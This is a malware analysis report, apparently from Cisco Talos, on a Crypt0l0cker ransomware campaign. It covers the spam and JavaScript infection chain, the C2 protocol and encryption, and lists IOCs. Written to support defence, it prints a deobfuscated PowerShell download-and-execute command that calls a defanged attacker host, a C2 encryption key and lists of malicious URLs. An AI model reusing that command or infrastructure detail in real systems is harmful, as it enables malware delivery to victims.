@@ -1,0 +1,441 @@
+
+Crypt0l0cker (TorrentLocker): Old Dog, New Tricks 
+
+
+
+
+
+
+This post is authored by Matthew Molyett, Holger Unterbrink and Paul Rascagneres.
+
+
+Executive Summary
+
+
+Ransomware continues to be a plague on the internet and still sets itself as the fastest growing malware family we have seen in the last number of years. In this post we describe the technical details about a newly observed campaign of the notorious Crypt0l0cker (aka TorrentLocker or Teerac) ransomware. Crypt0l0cker has gone through a long evolution, the adversaries are updating and improving the malware on a regular basis. Several indicators inside the samples we have analysed point to a new major version of the malware. We have already seen large campaigns targeting Europe and other parts of the world in 2014 and 2015. It seems to be that the actors behind these campaigns are back now and launching again massive spam attacks. This post will also give you insights about the level of sophistication this malware has reached.
+
+
+
+Cisco customers who have Cisco AMP configured to submit samples, allowed us to identify attempted attacks on their end users. We used that as an initial starting point for our investigations. A Nullsoft Installer based executable was used in an attempt to compromise the victim hosts. The adversaries were using the Nullsoft Installer to execute a malicious DLL which starts the unpacking process of the ransomware payload.
+
+
+
+
+
+This is a similar behavior, as seen in the previous version, which was distributed two weeks before this campaign. The attackers were also using the Nullsoft Installer to execute a malicious unpacking DLL. In that case it was called Cavalry.dll (and other names). Both Cavalry.dll and Incognito.dll are totally different from an obfuscation point of view, nevertheless they both eventually infect the local machine with Crypt0l0cker. 
+
+It is worth to note that besides using TLS encrypted back channels for exfiltrating user and other  information to servers placed in the internet, the sample uses Tor as a backup for these connections. 
+
+In other ransomware campaigns we have often seen that only the payment process was protected by Tor, not the whole infection chain. Crypt0l0cker appears to be using the Tor servers as fallbacks, if the SSL servers are not reachable. More and more malware is leveraging Tor to hide their tracks. Obviously this makes it harder to detect these campaigns in the network traffic (Tor traffic aside). It also takes more time to identify the malware infrastructure to finally take them down.
+
+As usual, after the infection process is done, the ransomware encrypts all user files and displays the well known user messages (see below). The malware also comes with full localization. The payload displays the messages in different languages depending on the victim’s geographic location based on his or her IP address (including some grammar mistakes which suggest native speakers were not used for translation but perhaps services similar to Google Translate):
+
+Victim IP address in Germany:
+
+
+Fig.B
+
+
+Victim IP address in Italy:
+
+
+Fig.C
+
+
+
+Victim IP address in the UK:
+
+
+Fig.D
+
+
+The attackers were using a Web2Tor gateway to make it easier for the victim to get to the Decryption Portal hosted on the Tor network. This means the victim does not need to install a Tor browser as required by older versions of the ransomware. In this case the Tor browser option serves as a fallback in case the Web2Tor Gateway does not work, as it is visible in the above messages.
+
+The Crypt0L0cker decryption portal displays instructions on how to pay for the decryption of the encrypted files:
+
+
+Fig.E
+
+
+The screenshots prove that today's ransomware often comes with a user friendly interface. In this case, the attackers try to make it as easy as possible for the victim to transfer money. The ransomware is offering a free decryption of one file as a proof of attacker’s ability to restore the encrypted files, so that the user agrees to pay the full ransom (see Fig.F).
+
+
+
+Fig. F
+
+
+To appear more professional, the attackers have also created an FAQ page as well as a support form allowing the victim to contact them directly. See Fig. G and H below.
+
+
+Fig.G
+
+
+
+Fig.H
+
+
+  
+
+Technical Details
+
+
+
+Binary Analysis 
+The adversaries are using a multi stage packer to unpack the actual ransomware payload.
+
+
+Fig.I
+
+
+
+
+
+After the packer has unpacked the actual ransomware payload, it starts to encrypt the user files. 
+
+It is using the AES CBC algorithm and encrypts a maximum of 0x100000 bytes per file. The key is randomly generated per attack attempt and is send to the server as Message ID 1 before any encryption is attempted (see command and control channel below). Before sending the AES key, it is encrypted with RSA using the WinCryptAPI and a public key which is embedded in the binary. If the attack is interrupted then a new AES key is generated. LibTomCrypt is used for the AES CBC encryption. 
+
+In addition to encrypting files on the local drive, Crypt0l0cker is also scanning connected external drives e.g. USB drives and shared network resources for files to encrypt.
+
+Crypt0l0cker is using a list of file extensions. Files with these extensions are excluded from the file encryption process. It is interesting to see that the authors also exclude some image and text formats, perhaps to prevent the malware from encrypting its own files including the ransom messages and log files. 
+
+File extensions excluded from encryption are:
+exe,dll,sys,vdx,vxd,com,msi,scr,cpl,bat,cmd,lnk,url,log,log2,tmp,###,ini,chm,manifest,inf,html,txt,bmp,ttf,png,ico,gif,mp3,wav,avi,theme,evtx,folder,kdmp
+
+Beside of encrypting files, it also tries to access some email client data e.g. Thunderbird contacts and exfiltrates them. If you are a Windows XP user, the protected storage (Pstore) is also exfiltrated. 
+
+Crypt0l0cker writes several different log files to disk which maintain the status of the infection and encryption process (see Table A). The ewiwobiz log file (Code 0) starts with a status number. This number is read by the malware everytime it starts up, allowing it to resume where it was, if the infection and encryption processes are interrupted. This number is stored in an AES encrypted format. The function writing the status informations to disk takes the code below as one of its arguments. 
+
+
+Table.A
+
+
+Talos analyzed the command and control channel used by Crypt0l0cker. All messages to the server begin with the following function block (see below). When connecting over Tor the block includes the system's external IP address, used to define the language used for the ransom messages.
+
+struct System_Information_Block_Hdr{        wchar_t System_And_Binary_Identification[128],        char External_Ip_Address[16], // Tor Only        char Message_ID,        unsigned int Additional_Data_Size,        unsigned char[]}
+Message ID 0: Seems to be an initial hello. The response to Message ID 0 resembles to:
+
+parser.Data.append( "RansomFilename" )                                                                            # Value: yluwaguzparser.Data.append( "%%1%%" )parser.Data.append( "This is an <h1>HTML Ransom note</h1>!" )     # Value: opuwuquzparser.Data.append( "%%2%%" )parser.Data.append( "This is a *TXT Ransom note*!" )                                     # Value: aguwaluzparser.Data.append( "%%3%%" )parser.Data.append( "More" )                                                                                                           # Value: uquwupuz
+
+Message ID 1 (=Sending the server the encrypted AES key). In addition to the encrypted AES key Message ID 1 also includes an Adler32 Checksum of the plaintext key.
+
+Message ID 2 exfiltrates the content of log/storage file 7: the number of currently encrypted files.
+
+Message IDs 3-6 are used for exfiltrating contact information, stolen email contacts and the protected storage (Pstore) protected data on Windows XP. 
+
+All the command and control communication is AES encrypted with the following base-64 encoded key "+sE1f/z+yCqxGuwIjmjx0DH0RwrdkifakZGwEX76iWY=". This wrapping is 
+performed in addition to TLS or TOR tunnel. This so-called double wrapped communication is required because the TLS does not perform any server verification which renders it vulnerable to man in the middle attacks.
+
+It was a big suprise to us that one of the version of Crypt0locker that we investigated did not have shadow copy deletion functionality.  Therefore its possible to recover files using tools that can read the shadow copy facilities. It is likely that this is an issue in their build script or similar as far as former versions of Crypt0l0cker had this feature and were deleting the shadow copies.
+
+DNS Details
+The binary tries to connect to the following domains:
+
+hxxps://ajysivilaz.giftbests.comhxxps://ecpficy.giftbests.comhxxps://ecpficy.giftbests.comhxxps://eruhec.giftbests.comhxxps://eruhec.giftbests.comhxxps://hjaqvd.giftbests.comhxxps://ivejuciwazu.giftbests.comhxxps://jzawocenigy.giftbests.comhxxps://jzawocenigy.giftbests.comhxxps://ogalysupuho.giftbests.comhxxps://ogalysupuho.giftbests.comhxxps://otuk.giftbests.comhxxps://otuk.giftbests.comhxxps://udyrhxu.giftbests.comhxxps://ujihyjyredi.giftbests.comhxxps://ujihyjyredi.giftbests.comhxxps://uqaxu.giftbests.comhxxps://uqaxu.giftbests.comhxxps://uryk.giftbests.comhxxps://uryk.giftbests.com
+
+And additionally to the following domains to check the external IP address of the victim's machine. Based on the response, a localized message is presented to the victim after the files were encrypted.
+
+hxxp://ipecho.nethxxp://Myexternalip.comhxxp://wtfismyip.com
+
+This is a very similar behaviour like we have seen in the privious version. The previous version samples are also reaching out to a number of randomly generated subdomains like ugaqucy.sharptok.org and others. The giftbests.com domain registration schema follows the same method like we have seen before. 
+
+They are all registered to the same russian ISP “reg.ru” with IANA Id 1606 and protected by a WHOIS protection service. The email used to register them is only used once for the particular domain e.g.
+
+Who registered giftbests.com:
+
+
+Fig.J
+
+What other domains has this email registered ? Only one.  
+
+
+Fig.K
+
+
+DNS requests for the domain giftbests.com shows a few spikes before the campaign goes into an idle stage with half or even less number of DNS requests per hour. We can assume that this might be the result of the adversaries behind the campaign changing parameters of the campaigns e.g. new binaries, new droppers etc and/or launching new spam campaigns at these points in time. It also shows that these campaigns are not using these domains for too long. The active phase seems to be restricted to a few days.
+
+giftbests.com:
+
+
+Fig.L
+
+
+
+
+This pattern of behaviour is even more pronounced for the other domains we monitored during the previous campaign:
+
+divamind.org:
+
+
+Fig.M
+
+sharptok.org:
+
+
+Fig.N
+
+
+Talos has analyzed the number of registered subdomains and Sharptok.org has more than 9999 subdomains registered. We stopped the correlation at this point. 
+
+For giftbests.com we found at least 273 and for divamind.org at least 63 registered subdomains. All following the same schema of <some random characters for subdomain>.<domain name> for example hjaqvd.giftbests.com.
+
+The domain giftbests.com is using the following name server, which are registered with a German Registrar. 
+
+
+Fig.O
+
+
+
+Fig.P
+
+
+
+This is not uncommon. Germany has one of the strictest privacy laws and we see a lot of malware misusing this to make it harder to get background information about the campaigns. Frequently Germany or the Netherlands are the preferred countries in Europe where criminals like to hide their online identities. 
+
+Aside from TLS traffic going to the domains above, the sample is using the Tor network for resilience. The malware sends the same data sent to the TLS servers to the following hidden Tor servers reachable via the following onion service addresses:  
+
+xiodc6dmizahhijj.onionw7yr6b5oktcjo2jj.onionkghynzmoq7kvdzis.onionsyhkhuiml35mt5qh.onionx5sbb5gesp6kzwsh.onion
+
+The malware uses simple logic to determine which infrastructure to use -  if the TLS servers are not reachable use the Tor servers as backup. 
+
+
+Initial Infection Vector Details
+We correlated the information found above to find the initial infection vectors in our telemetry data. The victims were mainly infected by spam emails. Let us describe one of these campaigns in detail. The emails contains a .zip file as attachment. The archive itself contains a JavaScript file. The filename of the JavaScript follows the following patterns:
+
+
+Fattura_[random number on 6 digits].js
+fattura n.4587 7.02.2017.js
+
+
+
+Fig.Q
+
+
+The email written in Italian, translates to:  
+
+"Invoice 599044Hi,you can find a copy of the invoice 599044 related to the goods shipped today in the attachment.Regards,Gaia Leone (Name, Surname)
+
+From our telemetry, this specific campaign started the 7th of February. Let’s have a look to the layers of obfuscation regarding the attachment.
+
+Stage 1: JavaScript Obfuscation: The analyzed JavaScript (7505f9a8c2092b255f9f41571fba2c09143b69c7ab9505c28188c88d4c80c5a7) is obfuscated: 
+
+
+Fig.R
+
+
+The obfuscation algorithm is based on strings manipulation. Once decoded, the JavaScript executes a second stage which is a PowerShell script.
+
+Stage 2: PowerShell Obfuscation
+
+The second stage is obfuscated too. Please see the PowerShell script below. 
+
+
+Code A
+
+
+
+
+The obfuscation uses a string manipulation too. If we put the strings in the correct order we have the following script:
+
+Set-ExecutionPolicy Bypass -Scope Process $path=($env:temp+\agcedho.exe New-Object System.Net.Webclient).DownloadFile(hxxp://quatang.thackhoi.com/system.ohp,$path); Start-Process $path
+
+The purpose is to download a PE file from hxxp://quatang.thackhoi.com/system.ohp and store it in the user directory:  “C:\Users\[User]\AppData\Local\Temp” with the filename “agcedho.exe” and then execute the file. 
+
+
+These are other PE file hashes identified by Talos based on this URL:
+287ebf60c34b4a18e23566dbfcf5ee982d3bace22d148b33a27d9d1fc8596692e
+53dd7c23b2efefa6485b7e2ff92e36e
+ddac25f45f70af5c3edbf22580291aebc26232b7cc4cc37b2b6e095baa946029a3
+9032fa6d957a7a8f3c646ebff9311e
+2245a4981fdee4fc1df7e35cc4829f5fa286cabf1f2b4a4d272e8fa323ac2a41c82b
+0dc4c585c4051d9fe1212fc57e27
+1ffb16211552af603a6d13114178df21d246351c09df9e4a7a62eb4824036bb657
+a85be0b294c393fbf1c9b51f5a46b3 
+
+The Command and Control infrastructure reversed from the samples
+
+We deobfuscated the samples mentioned in the IOCs chapter in order to identify the infrastructure use to download the final payload. 
+
+hxxp://quatang.thackhoi.com/system.ohphxxp://directory.submitlocally.com/res.jnbhxxp://fanrp.com/test.bhuhxxp://ileriteknikservis.com/wp-log.bnmhxxp://nji.fileserver4390.org/file/bord.vcxhxxp://prorubim.com/led.poihxxp://rubbishinteriors.com/401.hjihxxp://saudail-alpin.no/point.gkp 
+
+
+
+Among the servers mentioned above, the available ones are all powered by WordPress. Checking the versions of WordPress running on these, shows that these are unpatched systems running outdated versions of WordPress. It is likely that the adversaries used a vulnerability in WordPress to compromise these machines. This would be consistent with many of the campaigns Talos has investigated in the recent past. Typically, within a few days of a WordPress vulnerability being discovered, attackers scan for WordPress sites that can be compromised. Hence, keeping WordPress based systems fully patched is vital to prevent such sites from being abused in attacks such as these.
+
+
+
+IOCs 
+
+
+
+Domains from sample:
+ajysivilaz.giftbests.com
+ecpficy.giftbests.com
+ecpficy.giftbests.com
+eruhec.giftbests.com
+eruhec.giftbests.com
+hjaqvd.giftbests.com
+ivejuciwazu.giftbests.com
+jzawocenigy.giftbests.com
+jzawocenigy.giftbests.com
+ogalysupuho.giftbests.com
+ogalysupuho.giftbests.com
+otuk.giftbests.com
+otuk.giftbests.com
+udyrhxu.giftbests.com
+ujihyjyredi.giftbests.com
+ujihyjyredi.giftbests.com
+uqaxu.giftbests.com
+uqaxu.giftbests.com
+uryk.giftbests.com
+uryk.giftbests.com
+
+Other related domains:
+<random chars>.Sharptok.org 
+<random chars>.Divamind.org 
+
+Tor addresses found in the sample:
+xiodc6dmizahhijj.onion
+w7yr6b5oktcjo2jj.onion
+kghynzmoq7kvdzis.onion
+syhkhuiml35mt5qh.onion
+x5sbb5gesp6kzwsh.onion
+
+AMP samples analyzed:
+C326b820c6184521b18fef27741fadb628414839ace202352db29608f17f995d 
+3c413bf58186282a6ecfec8e6a3f7a6b931b15cd404961accfc7665ad8372a92 
+C11762004e8a1f31e5e45c21c7af2db2fb304952f0d02e467bc55a8fc0194e8c (other)
+
+Dropped binaries:
+Incognito.dll 
+78f720f09a6ad23a0332c6531c4792a74d554d66d36f007d1e94bdd9c4fb2d1a
+
+Crytp0l0cker.exe 
+07dab1e46585e90dd9fc1d82b572d454102e09e25e50fc634145dd999b440ee7
+
+Crytp0l0cker.dll 
+Ace22efeff8824d0297d7ecd7430ca1f89bf49f394185ec6208e754d0bf505bc
+
+Crytp0l0cker.Upack.dll 
+
+5bd73eb812173508fc8dc2d8d23f50ea219dc94211a64d5840655ba3e6b0d889
+
+Italian spam JS:
+7505f9a8c2092b255f9f41571fba2c09143b69c7ab9505c28188c88d4c80c5a7
+e3166a14289b69956beba9fe0ac91aaeeff4c50fc9eb6a15a22864575fcc22fc
+2c8c0d8e1d74a02c44b92e1ee90a1f192e3ea3f65b29bcbba8fe6fc860e8dc6b
+197aa2490e81362e651af2ab8e4ae2c41a5da1a2812e4377719596a2eb2b8c8f
+899c4eb640f97c3b198970e9d25d0464361f3bf5f8839b16f1e10493a82c5382
+899c4eb640f97c3b198970e9d25d0464361f3bf5f8839b16f1e10493a82c5382
+e32cbfce6291382a188d2dae50c4b3c2a173097f2b4fc17904daceac9b2f3396
+0044e8a82a234674a070e9695f80f418ab72d351a4123b528e51b2b9eb2e44eb
+744b169cc40871e9c39409dbd89879c499433625f9fed1adfc700edcf293b1b0
+f893dbf5891995984e564c44878dd5c8dea94812c3df7b995d79159bca051f79
+3745e6e8419a2090130473cb0b8197031fee9c07a824395d1ab261257def3100
+ea1f0f1ff85130dc4634019d9e305d35097483d38e37c8aa4dc6c81b7aed1418
+1e2cb0cf9b5b7e7b825fda20a37e5c6e1bb9c548eb89cc457026e4cbee35cd23
+cb9050f37dfc7e19b59d3ef4e332efcf2bc04c5707f41b43453f6c50d3740bc4
+de183a7886c3dedbbb1d9260934f0d6e7d4abca72fb942c573dc74ac449c4bfc
+9e0ee793008c69494627383251098e1d500212a77fd025f6645c47ffabf015eb
+de183a7886c3dedbbb1d9260934f0d6e7d4abca72fb942c573dc74ac449c4bfc
+87fce23e17a86775b210c81089013ca7c058c03cd1b83b79b73413bd380efced
+9e0ee793008c69494627383251098e1d500212a77fd025f6645c47ffabf015eb
+87fce23e17a86775b210c81089013ca7c058c03cd1b83b79b73413bd380efced
+bcd94a7c4a24645948c46afb2616720e2bb166bc327e63dfe2b8c3135accb548
+ccb3eba9526df1d9eb983bb5259c47e552efb4fdf8cd95e6a6b6856351114b8f
+076bb85648f5a5e09c85dbf5997b58e7580031e64e5555a58ac0c3bce62a857b
+76f3828bfc53aa3d2f3057521c913797c1e3a7cb8331112bb1771ec6d4241e66
+
+URL from the JS:
+hxxp://directory.submitlocally.com/res.jnb
+hxxp://fanrp.com/test.bhu
+hxxp://ileriteknikservis.com/wp-log.bnm
+hxxp://nji.fileserver4390.org/file/bord.vcx
+hxxp://prorubim.com/led.poi
+hxxp://quatang.thackhoi.com/system.ohp
+hxxp://rubbishinteriors.com/401.hji
+hxxp://saudail-alpin.no/point.gkp
+
+URL from our telemetry:
+hxxp://humannecessityfoundation.com/php.oiw
+hxxp://ltmp.joymes.pl/file/bon.ijn
+hxxp://staracer.com.br/robots.ckl
+hxxp://fms-uchet.ru/multi.rty
+hxxp://gidrostroy-nn.ru/wp-includes/feed.gtb
+hxxp://quatang.thackhoi.com/system.ohp
+hxxp://ltmp.applepice.pl/file/set.rte
+hxxp://ltmp.joymes.pl/file/vet.bnm
+hxxp://arkatechknowledges.com/wp-admin/link.rew
+hxxp://blisunn.com/test.gtr
+hxxp://iuhd873.omniheart.pl/file/set.rte
+hxxp://saunabau.sk/index.pjk
+hxxp://ltmp.joymes.pl/file/nib.vcb
+hxxp://cyjt.com/left.lop
+hxxp://48f4339.js2-order.pl/file/set.rte
+hxxp://4839.js2-order.pl/file/set.rte
+hxxp://fanrp.com/test.bhu
+hxxp://drjacobberger.com/fav.vcb
+hxxp://biotechclinical.com/leet.tjr
+hxxp://partylimobusnj.com/wp-conf.tyu
+hxxp://glutenfreeworks.com/lftAd.vfd
+hxxp://mayaastro.com/wp-conf.bgt
+hxxp://ileriteknikservis.com/wp-log.bnm
+hxxp://ansagoldcoast.com/pols.vfr
+hxxp://www.mmgmarketing.com/wu.vbn
+hxxp://flyanairliner.com/tire.bnm
+hxxp://activmedia.net/license.ttx
+hxxp://www.girokonto.club/wp-conf.ghj
+hxxp://cyjt.com/left.lop
+hxxp://saudail-alpin.no/point.gkp
+
+More IOC provided as files:
+Domains found via domain correlation, most unused so far.
+
+$cat giftbests.com-sorted.txt | wc -l
+273
+
+$cat sharptok.org-sorted.txt | wc -l
+9999
+
+$cat divamind.org-sorted.txt | wc -l
+63
+
+Summary
+
+We have shown in this analysis that ransomware is still one of the biggest threats in the industry and that the techniques used by the authors are getting more and more sophisticated. Today's ransomware not only encrypts files on the local hard drive, it also tries to encrypt every other reachable file, e.g. files on network shares or USB drives. Additionally to the ransomware threat, Crypt0l0cker also steals email contacts and other sensitive data. 
+
+The adversaries use a clever mix of different obfuscation technologies. All stages of the attack are heavily obfuscated to bypass common security products. It begins with the initial infection vector when the malware is send to the victim via spam email. Attachments are zip files which contain malicious obfuscated javascript which itself unpacks a powershell script. This script downloads the actual obfuscated ransomware. The ransomware itself is an executable which is packed multiple times with different techniques. Finally after 6 layers of obfuscation (2 in the dropper, 4 in the executable) the final ransomware code starts to execute. 
+
+From a networking and DNS perspective the adversaries are also trying everything to hide their tracks. All communication is encrypted and/or protected by Tor. Domains are registered to a single fake email, which is not used in any other campaign. All DNS information is protected by a WHOIS protection service. 
+
+To our suprise, one of the versions of Crypt0locker that we investigated did not have shadow copy deletion functionality.  Therefore its possible to recover files using tools that can read the shadow copy facilities. That is especially interesting, because former versions of Crypt0l0cker had this feature implemented and deleted the Windows shadow copies. In other words, if you are a victim of crypt0l0cker, it is worth a try. 
+
+Addressing the overall threat that ransomware presents requires organizations to be aware that adversaries will continue to evolve. Utilizing a multi-layered defensive approach will help organizations be able to detect and protect against threats like Crypt0l0cker. Talos continues to monitor Crypt0l0cker as it evolves to ensure that defenses protect our customers. We strongly encourage users and organizations to follow recommended security practices, such as installing security patches as they become available, exercising caution when receiving messages from unknown third-parties, and ensuring a robust offline backup solution is in place. These practices will help reduce the threat of a compromise and should aid in the recovery of any such attack. We also heavily recommend to contact the local authorities if you become a victim of ransomware.
+
+
+
+
+
+Coverage
+
+Additional ways our customers can detect and block this threat are listed below.
+
+Advanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors.
+
+CWS or WSA web scanning prevents access to malicious websites and detects malware used in these attacks. 
+
+Email Security can block malicious emails sent by threat actors as part of their campaign.
+
+The
+Network Security protection of IPS and NGFW have up-to-date signatures to detect malicious network activity by threat actors.
+
+AMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security products.
+
+Umbrella blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network.
+
+
+
+
+
+
+
+
